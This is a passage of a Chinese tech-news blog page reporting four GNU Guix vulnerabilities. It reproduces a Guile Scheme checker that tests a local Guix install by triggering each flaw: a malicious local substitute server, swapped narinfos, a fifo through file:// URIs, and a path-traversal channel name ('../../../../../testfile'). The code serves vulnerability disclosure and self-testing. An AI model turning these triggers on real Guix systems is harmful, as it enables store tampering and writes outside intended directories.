class="string">&quot;type&quot;</span> <span class="string">&quot;regular&quot;</span></span><br><span class="line">                   <span class="string">&quot;contents&quot;</span> ,test-contents  <span class="string">&quot;)&quot;</span> <span class="string">&quot;)&quot;</span></span><br><span class="line">                   <span class="string">&quot;)&quot;</span>)))))</span><br><span class="line"></span><br><span class="line">  (<span class="name">define</span> bad-request</span><br><span class="line">    (<span class="name">build-response</span> #<span class="symbol">:code</span> <span class="number">400</span> #<span class="symbol">:reason-phrase</span> <span class="string">&quot;Unexpected request&quot;</span>))</span><br><span class="line"></span><br><span class="line">  (<span class="name">define</span> target-uri-path</span><br><span class="line">    (<span class="name">string-append</span> <span class="string">&quot;/&quot;</span> (<span class="name">store-path-hash-part</span> target-path) <span class="string">&quot;.narinfo&quot;</span>))</span><br><span class="line"></span><br><span class="line">  (<span class="name">define</span> nar-uri-path <span class="string">&quot;/example.nar&quot;</span>)</span><br><span class="line"></span><br><span class="line">  (<span class="name">define</span> (<span class="name">handle</span> request body)</span><br><span class="line">    (<span class="name">cond</span></span><br><span class="line">     ((<span class="name">not</span> (<span class="name">eq</span>? (<span class="name">request-method</span> request) &#x27;GET))</span><br><span class="line">      (<span class="name">values</span> bad-request <span class="string">&quot;&quot;</span>))</span><br><span class="line">     ((<span class="name">string=</span>? (<span class="name">uri-path</span> (<span class="name">request-uri</span> request)) target-uri-path)</span><br><span class="line">      (<span class="name">format</span> (<span class="name">current-error-port</span>)</span><br><span class="line">              <span class="string">&quot;Returning narinfo pointing to test nar~%&quot;</span>)</span><br><span class="line">      (<span class="name">values</span> (<span class="name">build-response</span> #<span class="symbol">:code</span> <span class="number">200</span>)</span><br><span class="line">              new-target-info-contents))</span><br><span class="line">     ((<span class="name">string=</span>? (<span class="name">uri-path</span> (<span class="name">request-uri</span> request)) nar-uri-path)</span><br><span class="line">      (<span class="name">format</span> (<span class="name">current-error-port</span>) <span class="string">&quot;Returning test nar~%&quot;</span>)</span><br><span class="line">      (<span class="name">values</span> (<span class="name">build-response</span> #<span class="symbol">:code</span> <span class="number">200</span>)</span><br><span class="line">              test-nar))</span><br><span class="line">     (<span class="name">else</span></span><br><span class="line">      (<span class="name">values</span> bad-request <span class="string">&quot;&quot;</span>))))</span><br><span class="line"></span><br><span class="line">  (<span class="name">call-with-port</span> (<span class="name">socket</span> PF_INET SOCK_STREAM <span class="number">0</span>)</span><br><span class="line">    (<span class="name">lambda</span> (<span class="name">sock</span>)</span><br><span class="line">      (<span class="name">setsockopt</span> sock SOL_SOCKET SO_REUSEADDR <span class="number">1</span>)</span><br><span class="line">      (<span class="name">bind</span> sock (<span class="name">make-socket-address</span> AF_INET INADDR_LOOPBACK <span class="number">0</span>))</span><br><span class="line">      (<span class="name">listen</span> sock <span class="number">5</span>)</span><br><span class="line">      (<span class="name">let*</span> ((<span class="name">port-number</span> (<span class="name">sockaddr</span><span class="symbol">:port</span> (<span class="name">getsockname</span> sock)))</span><br><span class="line">             (<span class="name">substitute-url</span> (<span class="name">string-append</span> <span class="string">&quot;http://localhost:&quot;</span></span><br><span class="line">                                            (<span class="name">number-&gt;string</span> port-number)</span><br><span class="line">                                            <span class="string">&quot;/&quot;</span>))</span><br><span class="line">             (<span class="name">server-thread</span> (<span class="name">call-with-new-thread</span></span><br><span class="line">                             (<span class="name">lambda</span> ()</span><br><span class="line">                               (<span class="name">run-server</span> handle http</span><br><span class="line">                                           `(#<span class="symbol">:socket</span> ,sock))))))</span><br><span class="line">        (<span class="name">with-store</span> store</span><br><span class="line">          (<span class="name">set-build-options</span> store</span><br><span class="line">                             #<span class="symbol">:substitute-urls</span> (<span class="name">list</span> substitute-url))</span><br><span class="line">          (<span class="name">guard</span> (<span class="name">c</span> ((<span class="name">store-error</span>? c)</span><br><span class="line">                     <span class="comment">;; XXX doesn&#x27;t actually cancel until something tries</span></span><br><span class="line">                     <span class="comment">;; connecting</span></span><br><span class="line">                     (<span class="name">cancel-thread</span> server-thread)</span><br><span class="line">                     <span class="comment">;;(join-thread server-thread)</span></span><br><span class="line">                     (<span class="name">and</span> (<span class="name">file-exists</span>? target-file)</span><br><span class="line">                          (<span class="name">string=</span>? (<span class="name">call-with-input-file</span> target-file</span><br><span class="line">                                      get-string-all)</span><br><span class="line">                                    test-contents))))</span><br><span class="line">            (<span class="name">build-things</span> store (<span class="name">list</span> target-path))</span><br><span class="line">            <span class="comment">;; If the substitution actually completes without throwing then we</span></span><br><span class="line">            <span class="comment">;; are most definitely vulnerable, but not just in &#x27;restore-path&#x27;.</span></span><br><span class="line">            (<span class="name">error</span> <span class="string">&quot;!!!substitution of invalid nar completed???!!!&quot;</span>)))))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">;; 2. fetch-narinfos</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;; Identify two substitutable paths P1 and P2.  Get P1 and P2&#x27;s signed</span></span><br><span class="line"><span class="comment">;; narinfos, start an http server, connect to store, set substitute urls, ask</span></span><br><span class="line"><span class="comment">;; whether P1 and P2 are substitutable.  Have http server serve P2&#x27;s narinfo</span></span><br><span class="line"><span class="comment">;; when asked for P1&#x27;s, and P1&#x27;s when asked for P2&#x27;s.  If vulnerable, it will</span></span><br><span class="line"><span class="comment">;; report that both are substitutable, if not, it will report that neither</span></span><br><span class="line"><span class="comment">;; are.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;; We need two substitutable paths because the daemon&lt;--&gt;&#x27;guix substitute</span></span><br><span class="line"><span class="comment">;; --query&#x27; interface verifies that the info it gets back is for a path that</span></span><br><span class="line"><span class="comment">;; was requested, so the &quot;replacement&quot; path has to also be queried for</span></span><br><span class="line"><span class="comment">;; substitutability at the same time.</span></span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> (<span class="name">fetch-narinfos-vuln</span>?)</span><br><span class="line">  (<span class="name">define-values</span> (<span class="name">hello-path</span> hello-info)</span><br><span class="line">    (<span class="name">with-store</span> store (<span class="name">package-&gt;path+narinfo</span> store hello)))</span><br><span class="line"></span><br><span class="line">  (<span class="name">define-values</span> (<span class="name">sed-path</span> sed-info)</span><br><span class="line">    (<span class="name">with-store</span> store (<span class="name">package-&gt;path+narinfo</span> store sed)))</span><br><span class="line"></span><br><span class="line">  (<span class="name">define</span> bad-request</span><br><span class="line">    (<span class="name">build-response</span> #<span class="symbol">:code</span> <span class="number">400</span> #<span class="symbol">:reason-phrase</span> <span class="string">&quot;Unexpected request&quot;</span>))</span><br><span class="line"></span><br><span class="line">  (<span class="name">define</span> hello-uri-path</span><br><span class="line">    (<span class="name">string-append</span> <span class="string">&quot;/&quot;</span> (<span class="name">store-path-hash-part</span> hello-path) <span class="string">&quot;.narinfo&quot;</span>))</span><br><span class="line"></span><br><span class="line">  (<span class="name">define</span> sed-uri-path</span><br><span class="line">    (<span class="name">string-append</span> <span class="string">&quot;/&quot;</span> (<span class="name">store-path-hash-part</span> sed-path) <span class="string">&quot;.narinfo&quot;</span>))</span><br><span class="line"></span><br><span class="line">  (<span class="name">define</span> (<span class="name">handle</span> request body)</span><br><span class="line">    (<span class="name">cond</span></span><br><span class="line">     ((<span class="name">not</span> (<span class="name">eq</span>? (<span class="name">request-method</span> request) &#x27;GET))</span><br><span class="line">      (<span class="name">values</span> bad-request <span class="string">&quot;&quot;</span>))</span><br><span class="line">     ((<span class="name">string=</span>? (<span class="name">uri-path</span> (<span class="name">request-uri</span> request)) hello-uri-path)</span><br><span class="line">      (<span class="name">format</span> (<span class="name">current-error-port</span>) <span class="string">&quot;Returning sed when asked for hello~%&quot;</span>)</span><br><span class="line">      <span class="comment">;; Return the wrong result</span></span><br><span class="line">      (<span class="name">values</span> (<span class="name">build-response</span> #<span class="symbol">:code</span> <span class="number">200</span>)</span><br><span class="line">              (<span class="name">narinfo-contents</span> sed-info)))</span><br><span class="line">     ((<span class="name">string=</span>? (<span class="name">uri-path</span> (<span class="name">request-uri</span> request)) sed-uri-path)</span><br><span class="line">      (<span class="name">format</span> (<span class="name">current-error-port</span>) <span class="string">&quot;Returning hello when asked for sed~%&quot;</span>)</span><br><span class="line">      <span class="comment">;; Return the wrong result</span></span><br><span class="line">      (<span class="name">values</span> (<span class="name">build-response</span> #<span class="symbol">:code</span> <span class="number">200</span>)</span><br><span class="line">              (<span class="name">narinfo-contents</span> hello-info)))</span><br><span class="line">     (<span class="name">else</span></span><br><span class="line">      (<span class="name">values</span> bad-request <span class="string">&quot;&quot;</span>))))</span><br><span class="line"></span><br><span class="line">  (<span class="name">unless</span> (<span class="name">and</span> hello-info sed-info)</span><br><span class="line">    (<span class="name">error</span> <span class="string">&quot;can&#x27;t find substitutable paths to test &#x27;fetch-narinfos&#x27; with&quot;</span>))</span><br><span class="line"></span><br><span class="line">  (<span class="name">call-with-port</span> (<span class="name">socket</span> PF_INET SOCK_STREAM <span class="number">0</span>)</span><br><span class="line">    (<span class="name">lambda</span> (<span class="name">sock</span>)</span><br><span class="line">      (<span class="name">setsockopt</span> sock SOL_SOCKET SO_REUSEADDR <span class="number">1</span>)</span><br><span class="line">      (<span class="name">bind</span> sock (<span class="name">make-socket-address</span> AF_INET INADDR_LOOPBACK <span class="number">0</span>))</span><br><span class="line">      (<span class="name">listen</span> sock <span class="number">5</span>)</span><br><span class="line">      (<span class="name">let*</span> ((<span class="name">port-number</span> (<span class="name">sockaddr</span><span class="symbol">:port</span> (<span class="name">getsockname</span> sock)))</span><br><span class="line">             (<span class="name">substitute-url</span> (<span class="name">string-append</span> <span class="string">&quot;http://localhost:&quot;</span></span><br><span class="line">                                            (<span class="name">number-&gt;string</span> port-number)</span><br><span class="line">                                            <span class="string">&quot;/&quot;</span>))</span><br><span class="line">             (<span class="name">server-thread</span> (<span class="name">call-with-new-thread</span></span><br><span class="line">                             (<span class="name">lambda</span> ()</span><br><span class="line">                               (<span class="name">run-server</span> handle http</span><br><span class="line">                                           `(#<span class="symbol">:socket</span> ,sock))))))</span><br><span class="line">        (<span class="name">with-store</span> store</span><br><span class="line">          (<span class="name">set-build-options</span> store</span><br><span class="line">                             #<span class="symbol">:substitute-urls</span> (<span class="name">list</span> substitute-url))</span><br><span class="line">          (<span class="name">let</span> ((<span class="name">substitutables</span></span><br><span class="line">                 (<span class="name">substitutable-paths</span> store (<span class="name">list</span> hello-path sed-path))))</span><br><span class="line">            <span class="comment">;; XXX doesn&#x27;t actually cancel until something tries connecting</span></span><br><span class="line">            (<span class="name">cancel-thread</span> server-thread)</span><br><span class="line">            <span class="comment">;;(join-thread server-thread)</span></span><br><span class="line">            (<span class="name">not</span> (<span class="name">null</span>? substitutables))))))))</span><br><span class="line"></span><br><span class="line"><span class="comment">;; 3. file-uris</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;; Create a fifo whose name is 32 nix-base32 characters followed by</span></span><br><span class="line"><span class="comment">;; &quot;.narinfo&quot;, connect to store, set substitute urls to point to containing</span></span><br><span class="line"><span class="comment">;; directory, spawn a thread to block trying to open fifo write-only which</span></span><br><span class="line"><span class="comment">;; will subsequently set a flag and close the port, then ask whether some</span></span><br><span class="line"><span class="comment">;; store path with that hash is substitutable.  It should fail in all cases.</span></span><br><span class="line"><span class="comment">;; Check whether the flag is set; if so, we&#x27;re vulnerable, otherwise we&#x27;re</span></span><br><span class="line"><span class="comment">;; not.</span></span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> (<span class="name">file-uris-vuln</span>?)</span><br><span class="line">  (<span class="name">call-with-temporary-directory</span></span><br><span class="line">   (<span class="name">lambda</span> (<span class="name">directory</span>)</span><br><span class="line">     (<span class="name">define</span> testfifo</span><br><span class="line">       (<span class="name">string-append</span> directory <span class="string">&quot;/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.narinfo&quot;</span>))</span><br><span class="line">     (<span class="name">define</span> opened? (<span class="name">make-atomic-box</span> #f))</span><br><span class="line">     (<span class="name">define</span> store-item</span><br><span class="line">       (<span class="name">string-append</span> (%store-prefix) <span class="string">&quot;/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-foo&quot;</span>))</span><br><span class="line"></span><br><span class="line">     (<span class="name">define</span> open-thread</span><br><span class="line">       (<span class="name">begin</span></span><br><span class="line">         (<span class="name">mknod</span> testfifo &#x27;fifo <span class="number">#o744</span> <span class="number">0</span>)</span><br><span class="line">         (<span class="name">call-with-new-thread</span></span><br><span class="line">          (<span class="name">lambda</span> ()</span><br><span class="line">            (<span class="name">call-with-port</span> (<span class="name">open</span> testfifo O_WRONLY)</span><br><span class="line">              (<span class="name">lambda</span> (<span class="name">port</span>)</span><br><span class="line">                (<span class="name">atomic-box-set!</span> opened? #t))))))) </span><br><span class="line"></span><br><span class="line">     (<span class="name">with-store</span> store</span><br><span class="line">       (<span class="name">set-build-options</span> store</span><br><span class="line">                          #<span class="symbol">:substitute-urls</span> (<span class="name">list</span> (<span class="name">string-append</span> <span class="string">&quot;file://&quot;</span> directory)))</span><br><span class="line">       (<span class="name">guard</span> (<span class="name">c</span> ((<span class="name">store-error</span>? c)</span><br><span class="line">                  (<span class="name">cancel-thread</span> open-thread)</span><br><span class="line">                  (<span class="name">delete-file</span> testfifo)</span><br><span class="line">                  <span class="comment">;; even though the file it is trying to open no longer</span></span><br><span class="line">                  <span class="comment">;; exists, the kernel doesn&#x27;t give a result to open-thread</span></span><br><span class="line">                  <span class="comment">;; until someone ptraces it (or maybe sends a signal or</span></span><br><span class="line">                  <span class="comment">;; something).</span></span><br><span class="line">                  <span class="comment">;; (join-thread open-thread)</span></span><br><span class="line">                  (<span class="name">atomic-box-ref</span> opened?)))</span><br><span class="line">         (<span class="name">substitutable-paths</span> store (<span class="name">list</span> store-item))</span><br><span class="line">         (<span class="name">error</span> <span class="string">&quot;not supposed to get here!\n&quot;</span>))))))</span><br><span class="line"></span><br><span class="line"><span class="comment">;; 4. cache-key</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;; Create a barebones git repository that is a valid channel, create a</span></span><br><span class="line"><span class="comment">;; &lt;channel&gt; that references it using a malformed name, set XDG_CACHE_HOME to</span></span><br><span class="line"><span class="comment">;; a directory inside a temporary directory (so that &#x27;cache-directory&#x27; points</span></span><br><span class="line"><span class="comment">;; to a subdirectory of it), call authenticate-channel, see if a file outside</span></span><br><span class="line"><span class="comment">;; of XDG_CACHE_HOME gets created.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;; If you don&#x27;t have Internet access, edit this to point to a local repository</span></span><br><span class="line"><span class="comment">;; containing at least commit 5a2d9baeda971df575c017669bca8eb8faa22ebd and its</span></span><br><span class="line"><span class="comment">;; ancestors, and the keyring branch.</span></span><br><span class="line">(<span class="name">define</span> guix-science-url</span><br><span class="line">  <span class="string">&quot;https://codeberg.org/guix-science/guix-science.git&quot;</span>)</span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> (<span class="name">create-test-channel</span> directory channel-name)</span><br><span class="line">  <span class="string">&quot;Populate REPOSITORY with the necessary contents for it to be a valid</span></span><br><span class="line"><span class="string">channel with 2 commits, then return three values: a &lt;channel&gt; for it with name</span></span><br><span class="line"><span class="string">CHANNEL-NAME and an introduction to the first commit, the first commit, and</span></span><br><span class="line"><span class="string">the second commit.&quot;</span></span><br><span class="line">  (<span class="name">define</span> intro-commit</span><br><span class="line">    <span class="string">&quot;b1fe5aaff3ab48e798a4cce02f0212bc91f423dc&quot;</span>)</span><br><span class="line"></span><br><span class="line">  (<span class="name">define</span> end-commit <span class="comment">;; The commit following intro-commit</span></span><br><span class="line">    <span class="string">&quot;5a2d9baeda971df575c017669bca8eb8faa22ebd&quot;</span>)</span><br><span class="line"></span><br><span class="line">  (<span class="name">define</span> fingerprint</span><br><span class="line">    <span class="string">&quot;CA4F 8CF4 37D7 478F DA05  5FD4 4213 7701 1A37 8446&quot;</span>)</span><br><span class="line"></span><br><span class="line">  (<span class="name">define</span> git %git) <span class="comment">;; From (guix config), guix has a hard dependency on git</span></span><br><span class="line"></span><br><span class="line">  (<span class="name">with-directory-excursion</span> directory</span><br><span class="line">    (<span class="name">invoke</span> git <span class="string">&quot;init&quot;</span></span><br><span class="line">            <span class="comment">;; Silence warning</span></span><br><span class="line">            <span class="string">&quot;--initial-branch=main&quot;</span>)</span><br><span class="line">    (<span class="name">invoke</span> git <span class="string">&quot;remote&quot;</span> <span class="string">&quot;add&quot;</span> <span class="string">&quot;--&quot;</span> <span class="string">&quot;origin&quot;</span> guix-science-url)</span><br><span class="line">    (<span class="name">invoke</span> git <span class="string">&quot;fetch&quot;</span> <span class="string">&quot;--&quot;</span> <span class="string">&quot;origin&quot;</span> end-commit)</span><br><span class="line">    (<span class="name">invoke</span> git <span class="string">&quot;checkout&quot;</span> <span class="string">&quot;FETCH_HEAD&quot;</span>)</span><br><span class="line">    (<span class="name">invoke</span> git <span class="string">&quot;fetch&quot;</span> <span class="string">&quot;--&quot;</span> <span class="string">&quot;origin&quot;</span> <span class="string">&quot;refs/heads/keyring:keyring&quot;</span>)</span><br><span class="line">    (<span class="name">values</span></span><br><span class="line">     (<span class="name">channel</span></span><br><span class="line">       (<span class="name">name</span> channel-name)</span><br><span class="line">       (<span class="name">url</span> (<span class="name">canonicalize-path</span> directory))</span><br><span class="line">       (<span class="name">introduction</span> (<span class="name">make-channel-introduction</span></span><br><span class="line">                      intro-commit</span><br><span class="line">                      (<span class="name">openpgp-fingerprint</span> fingerprint))))</span><br><span class="line">     intro-commit</span><br><span class="line">     end-commit)))</span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> (<span class="name">cache-key-vuln</span>?)</span><br><span class="line">  (<span class="name">call-with-temporary-directory</span></span><br><span class="line">   (<span class="name">lambda</span> (<span class="name">directory</span>)</span><br><span class="line">     (<span class="name">let</span> ((<span class="name">home</span> (<span class="name">string-append</span> directory <span class="string">&quot;/home&quot;</span>))</span><br><span class="line">           (<span class="name">channel-repo</span> (<span class="name">string-append</span> directory <span class="string">&quot;/channel-repo&quot;</span>))</span><br><span class="line">           (<span class="name">testfile</span> (<span class="name">string-append</span> directory <span class="string">&quot;/testfile&quot;</span>)))</span><br><span class="line">       (<span class="name">mkdir</span> home)</span><br><span class="line">       (<span class="name">mkdir</span> channel-repo)</span><br><span class="line">       (<span class="name">with-environment-variables</span> `((<span class="string">&quot;HOME&quot;</span> ,home)</span><br><span class="line">                                     (<span class="string">&quot;XDG_CACHE_HOME&quot;</span> ,(string-append home</span><br><span class="line">                                                                       <span class="string">&quot;/.cache&quot;</span>)))</span><br><span class="line">         (<span class="name">call-with-values</span></span><br><span class="line">             (<span class="name">lambda</span> ()</span><br><span class="line">               (<span class="name">create-test-channel</span> channel-repo</span><br><span class="line">                                    (<span class="name">string-&gt;symbol</span> <span class="string">&quot;../../../../../testfile&quot;</span>)))</span><br><span class="line">           (<span class="name">lambda</span> (<span class="name">channel</span> first-commit last-commit)</span><br><span class="line">             (<span class="name">authenticate-channel</span> channel channel-repo last-commit</span><br><span class="line">                                   #<span class="symbol">:keyring-reference-prefix</span> <span class="string">&quot;&quot;</span>)))</span><br><span class="line">         (<span class="name">file-exists</span>? testfile))))))</span><br><span class="line"></span><br><span class="line"><span class="comment">;; Results</span></span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> vulnerabilities</span><br><span class="line">  (<span class="name">list</span> (<span class="name">list</span> <span class="string">&quot;restore-file&quot;</span> restore-file-vuln?)</span><br><span class="line">        (<span class="name">list</span> <span class="string">&quot;fetch-narinfos&quot;</span> fetch-narinfos-vuln?)</span><br><span class="line">        (<span class="name">list</span> <span class="string">&quot;file-uris&quot;</span> file-uris-vuln?)</span><br><span class="line">        (<span class="name">list</span> <span class="string">&quot;cache-key&quot;</span> cache-key-vuln?)))</span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> (<span class="name">call-with-errors-to-string</span> proc)</span><br><span class="line">  (<span class="name">define</span> tag (<span class="name">make-prompt-tag</span>))</span><br><span class="line">  (<span class="name">call-with-prompt</span> tag</span><br><span class="line">    (<span class="name">lambda</span> ()</span><br><span class="line">      (<span class="name">with-throw-handler</span> #t</span><br><span class="line">        proc</span><br><span class="line">        (<span class="name">rec</span> (<span class="name">self</span> key . args)</span><br><span class="line">             (<span class="name">let*</span> ((<span class="name">stack</span> (<span class="name">make-stack</span> #t</span><br><span class="line">                                       <span class="number">1</span> <span class="comment">;self ;; Causes make-stack to return #f??</span></span><br><span class="line">                                       tag</span><br><span class="line">                                       ))</span><br><span class="line">                    (<span class="name">frames</span> (<span class="name">stack-length</span> stack))</span><br><span class="line">                    (<span class="name">frame</span> (<span class="name">stack-ref</span> stack <span class="number">0</span>)))</span><br><span class="line">               (<span class="name">define</span> error-string</span><br><span class="line">                 (<span class="name">match</span> args</span><br><span class="line">                   (((<span class="name">or</span> (? string? proc) (? symbol? proc))</span><br><span class="line">                     (? string? message) (<span class="name">args</span> ...) . rest)</span><br><span class="line">                    (<span class="name">call-with-output-string</span></span><br><span class="line">                      (<span class="name">lambda</span> (<span class="name">port</span>)</span><br><span class="line">                        (<span class="name">display-error</span> frame port proc message args</span><br><span class="line">                                       rest))))</span><br><span class="line">                   (<span class="name">args</span></span><br><span class="line">                    (<span class="name">call-with-output-string</span></span><br><span class="line">                      (<span class="name">lambda</span> (<span class="name">port</span>)</span><br><span class="line">                        (<span class="name">print-exception</span> port frame key args))))))</span><br><span class="line"></span><br><span class="line">               (<span class="name">display-backtrace</span> stack (<span class="name">current-error-port</span>))</span><br><span class="line">               (<span class="name">display</span> error-string (<span class="name">current-error-port</span>))</span><br><span class="line">               (<span class="name">abort-to-prompt</span> tag (<span class="name">string-append</span> <span class="string">&quot;error: &quot;</span></span><br><span class="line">                                                   (<span class="name">string-trim-both</span></span><br><span class="line">                                                    error-string)))))))</span><br><span class="line">    (<span class="name">lambda</span> (<span class="name">_</span> . args)</span><br><span class="line">      (<span class="name">apply</span> values args))))</span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> results</span><br><span class="line">  (<span class="name">map</span> (<span class="name">match-lambda</span></span><br><span class="line">         ((<span class="name">name</span> proc)</span><br><span class="line">          (<span class="name">list</span> name (<span class="name">if</span> (<span class="name">string</span>? proc)</span><br><span class="line">                         proc <span class="comment">;; pass message through</span></span><br><span class="line">                         (<span class="name">call-with-errors-to-string</span> proc)))))</span><br><span class="line">       vulnerabilities))</span><br><span class="line"></span><br><span class="line">(<span class="name">for-each</span> (<span class="name">match-lambda</span></span><br><span class="line">            ((<span class="name">name</span> vulnerable?)</span><br><span class="line">             (<span class="name">format</span> #t <span class="string">&quot;~a: ~a~%&quot;</span></span><br><span class="line">                     name</span><br><span class="line">                     (<span class="name">if</span> (<span class="name">boolean</span>? vulnerable?)</span><br><span class="line">                         (<span class="name">if</span> vulnerable? <span class="string">&quot;vulnerable&quot;</span> <span class="string">&quot;not vulnerable&quot;</span>)</span><br><span class="line">                         vulnerable?))))</span><br><span class="line">          results)</span><br><span class="line"></span><br><span class="line">(<span class="name">exit</span> (<span class="name">if</span> (<span class="name">any</span> second results) <span class="number">1</span> <span class="number">0</span>))</span><br></pre></td></tr></table></figure></div>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 科新文摘#2 | GNU Guix发现四个漏洞</li>
+        <li><strong>Author:</strong> 山河科技新闻社</li>
+        <li><strong>Created at
+                :</strong> 2026-07-05 16:42:30</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-07-05 17:48:33
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://jsj.shanhe.co/2026/07/05/guix-vulnerabilities/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-sa/4.0">CC BY-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/linux-abstract-gnu/">#linux, abstract, gnu</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/07/05/linux-tops-2026-cve-charts/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Linux登顶2026年CVE漏洞排行榜榜首，Greg KH表示这是件好事</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/07/05/apple-new-macbookpro-in-27/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">MacBook Pro全面改款：入门级机型将比预期更早迎来全新设计</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">科新文摘#2 | GNU Guix发现四个漏洞</div>
+		<ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%91%98%E8%A6%81%E6%8A%A5%E9%81%93%EF%BC%88%E6%9D%A5%E8%87%AALWN%EF%BC%89"><span class="nav-text">摘要报道（来自LWN）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%A8%E6%96%87%EF%BC%88%E6%9D%A5%E8%87%AAGNU-Guix%EF%BC%89"><span class="nav-text">全文（来自GNU Guix）</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">山河大学计算机学部主管 山河科技新闻社主办 | 投稿邮箱：net@shanhe.team</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2026</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">山河科技新闻社</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        17 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+            <div class="icp-info my-1"><a target="_blank" rel="nofollow" href="
+                
+                    https://beian.miit.gov.cn/
+                
+                ">鲁ICP备2024104854号</a></div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
